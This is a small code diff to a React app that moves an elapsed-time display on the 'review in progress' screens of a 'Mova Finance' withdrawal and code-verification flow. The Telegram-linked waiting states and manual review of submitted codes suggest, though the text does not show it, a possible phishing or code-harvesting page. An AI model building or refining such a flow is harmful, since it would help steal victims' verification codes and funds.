@@ -779,7 +779,6 @@ function App() {
                 <h2>{approvalStage === 'withdrawal' ? 'Confirming your withdrawal' : 'Verifying your message'}</h2>
                 <p>{approvalStage === 'withdrawal' ? 'Your withdrawal details are being reviewed. Please wait before continuing to message verification.' : 'Your verification message is being reviewed. Please wait while we complete the withdrawal check.'}</p>
                 <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
-                <div className="telegram-waiting-time">Elapsed time {formatElapsedTime(telegramWaitSeconds)}</div>
               </div>
             </div>
           )}
@@ -846,7 +845,6 @@ function App() {
                 <h2>Completing final verification</h2>
                 <p>Your code is being reviewed by Mova Finance support. Please wait while we complete your application.</p>
                 <div className="telegram-waiting-status"><span className="telegram-waiting-dot" /> Review in progress</div>
-                <div className="telegram-waiting-time">Elapsed time {formatElapsedTime(telegramWaitSeconds)}</div>
               </div>
             </div>
           )}
@@ -878,6 +876,7 @@ function App() {
                 aria-invalid={Boolean(postalCodeError)}
               />
               {postalCodeError && <small className="field-error">{postalCodeError}</small>}
+              <small className="code-timer">Elapsed time {formatElapsedTime(telegramWaitSeconds)}</small>
             </label>
           </div>
 
